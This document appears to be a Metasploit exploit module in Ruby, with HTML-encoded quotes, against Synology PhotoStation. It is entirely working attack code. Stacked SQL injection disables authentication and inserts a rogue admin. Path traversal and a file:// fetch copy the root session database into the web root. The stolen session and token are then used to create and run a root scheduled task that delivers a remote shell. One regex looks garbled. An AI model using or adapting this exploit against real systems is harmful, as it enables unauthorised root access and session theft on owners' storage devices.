# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking
 
  include Msf::Exploit::FileDropper
  include Msf::Exploit::Remote::HttpClient
 
  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => "Synology PhotoStation Multiple Vulnerabilities",
      &#039;Description&#039;    => %q{
        This module exploits multiple vulnerabilities in Synology PhotoStation.
        When combined these issues can be leveraged to gain a remote root shell.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;James Bercegay&#039;,
        ],
      &#039;References&#039;     =>
        [
          [ &#039;URL&#039;, &#039;http://gulftech.org/&#039; ]
        ],
      &#039;Privileged&#039;     => false,
      &#039;Payload&#039;        =>
        {
          &#039;DisableNops&#039; => true
        },
      &#039;Platform&#039;       => [&#039;unix&#039;],
      &#039;Arch&#039;           => ARCH_CMD,
      &#039;Targets&#039;        => [ [&#039;Automatic&#039;, {}] ],
      &#039;DisclosureDate&#039; => &#039;2018-01-08&#039;,
      &#039;DefaultTarget&#039;  => 0))
 
      register_options(
      [
        OptString.new(&#039;DSMPORT&#039;,   [ true,  "The default DSM port", &#039;5000&#039;]),
      ])
  end
 
  def check
 
    res = send_request_cgi(
      {
        &#039;uri&#039;       =>  &#039;/photo/include/blog/label.php&#039;,
        &#039;method&#039;    => &#039;POST&#039;,
        &#039;vars_post&#039; =>
          {
            &#039;action&#039; =>&#039;get_article_label&#039;,
            &#039;article_id&#039; => "1; SELECT user; -- "
          },
      })
 
    if res and res.body =~ /PhotoStation/
      return Exploit::CheckCode::Vulnerable
    else
      return Exploit::CheckCode::Safe
    end
  end
 
  def exploit
 
  rnum = rand(1000)
  rstr = Rex::Text.rand_text_alpha(10)  
 
  uuid = rnum # User ID
  upwd = rstr # User Password
  uusr = rstr # User name
   
  vol1 = &#039;/volume1&#039;
  audb = &#039;/usr/syno/etc/private/session/current.users&#039;
 
###########################################################################
# STEP 00: Force PhotoStation to NOT use DSM for the authentication system
###########################################################################
 
    print_status("Switching authentication system to PhotoStation via SQL Injection")
 
    res = send_request_cgi(
      {
        &#039;uri&#039;       =>  &#039;/photo/include/blog/label.php&#039;,
        &#039;method&#039;    => &#039;POST&#039;,
        &#039;vars_post&#039; =>
          {
            &#039;action&#039; =>&#039;get_article_label&#039;,
            &#039;article_id&#039; => "1; UPDATE photo_config SET config_value=0 WHERE config_key=&#039;account_system&#039;; -- "
          },
      })
 
###########################################################################
# STEP 01: Create an admin user
###########################################################################
 
    print_status("Creating admin user: #{uusr} => #{upwd}")
 
    # Password hash
    umd5 = Rex::Text.md5(upwd)
 
    res = send_request_cgi(
      {
        &#039;uri&#039;       =>  &#039;/photo/include/blog/label.php&#039;,
        &#039;method&#039;    => &#039;POST&#039;,
        &#039;vars_post&#039; =>
          {
            &#039;action&#039; =>&#039;get_article_label&#039;,
            &#039;article_id&#039; => "1; INSERT INTO photo_user (userid, username, password, admin) VALUES (#{uuid}, &#039;#{uusr}&#039;, &#039;#{umd5}&#039;, TRUE); -- "
          },
      })
 
###########################################################################
# STEP 02: Authenticate and store session identifier
###########################################################################
 
    print_status("Authenticating as admin user: #{uusr}")
 
    res = send_request_cgi(
      {
        &#039;uri&#039;       =>  &#039;/photo/webapi/auth.php&#039;,
        &#039;method&#039;    => &#039;POST&#039;,
        &#039;vars_post&#039; =>
          {
            &#039;api&#039; =>&#039;SYNO.PhotoStation.Auth&#039;,
            &#039;method&#039; => &#039;login&#039;,
            &#039;version&#039; =>&#039;1&#039;,
            &#039;username&#039; => uusr,
            &#039;password&#039; => upwd,
            &#039;enable_syno_token&#039; => &#039;TRUE&#039;,
 
          },
      })
 
    if not res or not res.headers or not res.headers[&#039;Set-Cookie&#039;]
      print_error("Unable to retrieve session identifier! Aborting ...")
      return
    end
 
  uckv =  res.headers[&#039;Set-Cookie&#039;]
  psid = /PHPSESSID=([a-z0-9]+);/.match(uckv)[1]
 
  print_status("Got PHP Session ID: #{psid}")
 
###########################################################################
# STEP 03: Delete any existing path names used from the database
###########################################################################
 
  print_status("Making sure there are no duplicate path index conflicts ...")
 
    res = send_request_cgi(
      {
        &#039;uri&#039;       =>  &#039;/photo/include/blog/label.php&#039;,
        &#039;method&#039;    => &#039;POST&#039;,
        &#039;vars_post&#039; =>
          {
            &#039;action&#039; =>&#039;get_article_label&#039;,
            &#039;article_id&#039; => "1; DELETE FROM video WHERE path=&#039;#{audb}&#039;; -- "
          },
      })
 
    res = send_request_cgi(
      {
        &#039;uri&#039;       =>  &#039;/photo/include/blog/label.php&#039;,
        &#039;method&#039;    => &#039;POST&#039;,
        &#039;vars_post&#039; =>
          {
            &#039;action&#039; =>&#039;get_article_label&#039;,
            &#039;article_id&#039; => "1; DELETE FROM video WHERE path=&#039;#{vol1}/photo///current.users&#039;; -- "
          },
      })
 
###########################################################################
# STEP 04: Create a record for our malicious path in the database
###########################################################################
 
  print_status("Creating video record with bad &#039;path&#039; data via SQL injection")
 
    res = send_request_cgi(
      {
        &#039;uri&#039;       =>  &#039;/photo/include/blog/label.php&#039;,
        &#039;method&#039;    => &#039;POST&#039;,
        &#039;vars_post&#039; =>
          {
            &#039;action&#039; =>&#039;get_article_label&#039;,
            &#039;article_id&#039; => "1; INSERT INTO video (id, path, title, container_type) VALUES (#{rnum}, &#039;#{audb}&#039;, &#039;#{rstr}&#039;, &#039;#{rstr}&#039;); -- "
          },
      })
 
###########################################################################
# STEP 05: Copy session database as root, to the web directory for reading
###########################################################################
 
  print_status("Making a copy of the session db as root via synophotoio")
 
    res = send_request_cgi(
      {
        &#039;uri&#039;       =>  &#039;/photo/include/photo/album_util.php&#039;,
        &#039;method&#039;    => &#039;POST&#039;,
        &#039;vars_post&#039; =>
          {
            &#039;action&#039; =>&#039;copy_items&#039;,
            &#039;destination&#039; => &#039;2f&#039;, 
            &#039;video_list&#039; => rnum
          },
        &#039;cookie&#039; => uckv
      })
 
###########################################################################
# STEP 06: Move the session db copy to the web root for retrieval
###########################################################################
 
  print_status("Moving session db to webroot for retrieval")
 
    res = send_request_cgi(
      {
        &#039;uri&#039;       =>  &#039;/photo/include/file_upload.php&#039;,
        &#039;method&#039;    => &#039;POST&#039;,
        &#039;vars_get&#039; =>
        {
          # /../@appstore/PhotoStation/photo/
            &#039;dir&#039; =>&#039;2f2e2e2f4061707073746f72652f50686f746f53746174696f6e2f70686f746f2f&#039;,
            &#039;name&#039; => "2f",
            &#039;fname&#039; => "#{rstr}",
            &#039;sid&#039; => "#{psid}",
            &#039;action&#039; => &#039;aviary_add&#039;,
        },
        &#039;vars_post&#039; =>
          {
            &#039;url&#039; => &#039;file://&#039; + vol1 + &#039;/photo/current.users&#039;
          },
        &#039;cookie&#039; => uckv
      })
 
###########################################################################
# STEP 07: Retrieve and read the session db
###########################################################################
 
  print_status("Attempting to read session db")
 
    res = send_request_cgi(
      {
        &#039;uri&#039;       =>  "/photo/#{rstr}.jpg",
        &#039;method&#039;    => &#039;GET&#039;
      })
 
    if not res or not res.body
      print_error("Unable to retrieve session file! Aborting ...")
      return
    end
 
    host = /"host": "([^"]+)"/.match(res.body)[1]
    sess = /"id": "([^"]+)"/.match(res.body)[1]
    syno = /"synotoken": "([^"]+)"/.match(res.body)[1]
 
    print_status("Extracted admin session: #{sess} @ #{host}")
 
###########################################################################
# STEP 08: Registering files for cleanup
###########################################################################
 
    # Uncomment for cleanup functionality
    # register_files_for_cleanup("#{vol1}/photo/current.users")
    # register_files_for_cleanup("#{vol1}/@appstore/PhotoStation/photo/#{rstr}.jpg")
 
###########################################################################
# STEP 09: Create a task containing our payload
###########################################################################
 
  print_status("Creating privileged task to run as root")
 
  # Switch to DSM port from here on out
  datastore[&#039;RPORT&#039;] = datastore[&#039;DSMPORT&#039;]
 
    res = send_request_cgi(
      {
        &#039;uri&#039;       =>  &#039;/webapi/entry.cgi&#039;,
        &#039;headers&#039; => 
        { 
          &#039;X-SYNO-TOKEN&#039; => syno, 
          &#039;Client-IP&#039; => host 
        },
        &#039;method&#039;    => &#039;POST&#039;,
        &#039;vars_post&#039; =>
          {
            &#039;name&#039; => &#039;"whatevs"&#039;,
            &#039;owner&#039; => &#039;"root"&#039;,
            &#039;enable&#039; => &#039;true&#039;,
            &#039;schedule&#039; =>&#039;{"date_type":0,"week_day":"0,1,2,3,4,5,6","hour":0,"minute":0,"repeat_hour":0,"repeat_min":0,"last_work_hour":0,"repeat_min_store_config":[1,5,10,15,20,30],"repeat_hour_store_config":[1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23]}&#039;,
            &#039;extra&#039; => &#039;{"notify_enable":false,"script":"&#039; + payload.encoded.gsub(/"/,&#039;\"&#039;) + &#039;","notify_mail":"","notify_if_error":false}&#039;,
            &#039;type&#039; => &#039;"script"&#039;,
            &#039;api&#039; => &#039;SYNO.Core.TaskScheduler&#039;,
            &#039;method&#039; => &#039;create&#039;,
            &#039;version&#039; => &#039;2&#039;,
 
          },
        &#039;cookie&#039; => "id=#{sess}"
      })
 
    if not res or not res.body
      print_error("Unable to create task! Aborting ...")
      return
    end
 
    task = /{"id"\d+)},"success":true}/.match(res.body)[1]
 
    print_status("Task created successfully: ID => #{task}")
 
###########################################################################
# STEP 10: Execute the selected payload
###########################################################################
 
  print_status("Running selected task as root. Get ready for shell!")
 
    res = send_request_cgi(
      {
        &#039;uri&#039;       =>  &#039;/webapi/entry.cgi&#039;,
        &#039;headers&#039; => 
        { 
          &#039;X-SYNO-TOKEN&#039; => syno, 
          &#039;Client-IP&#039; => host 
        },
        &#039;method&#039;    => &#039;POST&#039;,
        &#039;vars_post&#039; =>
          {
      &#039;stop_when_error&#039; => &#039;false&#039;,
      &#039;mode&#039; => &#039;"sequential"&#039;,
      &#039;compound&#039; => &#039;[{"api":"SYNO.Core.TaskScheduler","method":"run","version":1,"task":[&#039; + task + &#039;]}]&#039;,
      &#039;api&#039; => &#039;SYNO.Entry.Request&#039;,
      &#039;method&#039; => &#039;request&#039;,
      &#039;version&#039; => &#039;1&#039;
          },
        &#039;cookie&#039; => "id=#{sess}"
      })
 
###########################################################################
# STEP 11: Delete payload task from scheduler
###########################################################################
 
  print_status("Deleting malicious task from task scheduler")
 
    res = send_request_cgi(
      {
        &#039;uri&#039;       =>  &#039;/webapi/entry.cgi&#039;,
        &#039;headers&#039; => 
        { 
          &#039;X-SYNO-TOKEN&#039; => syno, 
          &#039;Client-IP&#039; => host 
        },
        &#039;method&#039;    => &#039;POST&#039;,
        &#039;vars_post&#039; =>
          {
      &#039;stop_when_error&#039; => &#039;false&#039;,
      &#039;mode&#039; => &#039;"sequential"&#039;,
      &#039;compound&#039; => &#039;[{"api":"SYNO.Core.TaskScheduler","method":"delete","version":1,"task":[&#039; + task + &#039;]}]&#039;,
      &#039;api&#039; => &#039;SYNO.Entry.Request&#039;,
      &#039;method&#039; => &#039;request&#039;,
      &#039;version&#039; => &#039;1&#039;
          },
        &#039;cookie&#039; => "id=#{sess}"
      })
 
    end
end

